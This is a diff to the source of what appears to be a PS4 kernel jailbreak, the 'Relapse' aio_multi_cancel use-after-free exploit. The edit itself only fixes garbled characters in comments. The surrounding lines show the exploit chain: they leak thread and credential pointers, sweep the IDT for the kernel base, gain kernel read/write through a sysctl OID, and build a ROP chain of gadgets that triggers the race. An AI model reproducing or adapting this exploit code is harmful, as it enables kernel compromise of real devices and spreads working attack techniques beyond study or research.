@@ -1,4 +1,4 @@
-// Relapse/663 (aio-multi-cancel UAF) kernel exploit â€” Vue port of polpNO.
+// Relapse/663 (aio-multi-cancel UAF) kernel exploit — Vue port of polpNO.
 //
 // Scope: Fuentes de tablas: 13.00 / 13.02 / 13.04 (idt anchor + oid sysctl grep'd
 // from jb-polpno.js + ps4-offsets reference; corroboration: 13.02/13.04 inherit
@@ -10,12 +10,12 @@
 // (relapse must be removed from loader's wait/busy-wait conditions).
 //
 // Flow: relapse_setup (pin main core, scratch page, arenas, socket pool,
-// blocking-AIO saturate, cancel worker via thr_new kernel thread) â†’
-// relapse_arm (chunked lkNodes build + armOnce) â†’ relapse_leak (chunked spin,
-// owner-stamp â†’ CT1 curthread leak) â†’ relapse_reap â†’ relapse_pass (passA/passB
-// decrement oracle â†’ UCRED) â†’ relapse_anchor (IDT sweep â†’ KBASE) â†’
-// relapse_rw (caps + KRW sysctl-oid window â†’ kernel.read_buffer/write_buffer)
-// â†’ relapse_jailbreak (curproc/allproc + jailbreak_shared + binloader).
+// blocking-AIO saturate, cancel worker via thr_new kernel thread) →
+// relapse_arm (chunked lkNodes build + armOnce) → relapse_leak (chunked spin,
+// owner-stamp → CT1 curthread leak) → relapse_reap → relapse_pass (passA/passB
+// decrement oracle → UCRED) → relapse_anchor (IDT sweep → KBASE) →
+// relapse_rw (caps + KRW sysctl-oid window → kernel.read_buffer/write_buffer)
+// → relapse_jailbreak (curproc/allproc + jailbreak_shared + binloader).
 //
 // Tunables via CONFIG: relapse_n, relapse_ka, relapse_spray, relapse_spin,
 // relapse_spin_chunk, relapse_towait, relapse_sweep, relapse_onum, relapse_retries.
@@ -482,7 +482,7 @@ function relapse_fail (reason: string, benign: boolean) {
 }
 
 // ---------------------------------------------------------------------------
-// Threading init (setjmp once for FPU context) â€” netctrl init_threading
+// Threading init (setjmp once for FPU context) — netctrl init_threading
 // ---------------------------------------------------------------------------
 function relapse_init_threading () {
   if (thread_once_done) return
@@ -750,7 +750,7 @@ function cancel_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: B
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
 
   const loop_init = rop.length
-  // read(pipe_0, signal_buf, 1) â€” blocks here between fires
+  // read(pipe_0, signal_buf, 1) — blocks here between fires
   rop.push(gadgets.POP_RDI_RET)
   rop.push(run_fd)
   rop.push(gadgets.POP_RSI_RET)
@@ -758,7 +758,7 @@ function cancel_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: B
   rop.push(gadgets.POP_RDX_RET)
   rop.push(new BigInt(1))
   rop.push(read_wrapper)
-  // aio_multi_cancel(idAd2, 1, stAd2) â€” the relapse step
+  // aio_multi_cancel(idAd2, 1, stAd2) — the relapse step
   rop.push(gadgets.POP_RDI_RET)
   rop.push(idAd2)
   rop.push(gadgets.POP_RSI_RET)
@@ -1108,7 +1108,7 @@ function relapse_leak_pre () {
 }
 
 // ---------------------------------------------------------------------------
-// PHASE 2b: chunked spin (owner-stamp leak) â†’ CT1
+// PHASE 2b: chunked spin (owner-stamp leak) → CT1
 // ---------------------------------------------------------------------------
 function relapse_leak_spin () {
   const chunk = SPIN_CHUNK
@@ -1188,7 +1188,7 @@ function relapse_pass_prelims () {
 }
 
 // ---------------------------------------------------------------------------
-// PHASE 3: passA/passB (decrement oracle) â†’ UCRED
+// PHASE 3: passA/passB (decrement oracle) → UCRED
 // ---------------------------------------------------------------------------
 function relapse_pass () {
   if (CT1 === null) {
@@ -1389,7 +1389,7 @@ function relapse_anchor_head () {
 }
 
 // ---------------------------------------------------------------------------
-// PHASE 4: CAPS + KRW sysctl-oid window â†’ kernel.read_buffer/write_buffer
+// PHASE 4: CAPS + KRW sysctl-oid window → kernel.read_buffer/write_buffer
 // ---------------------------------------------------------------------------
 function relapse_rw () {
   const OID = (KBASE as BigInt).add(K_TABLE!.oid_kern_file)
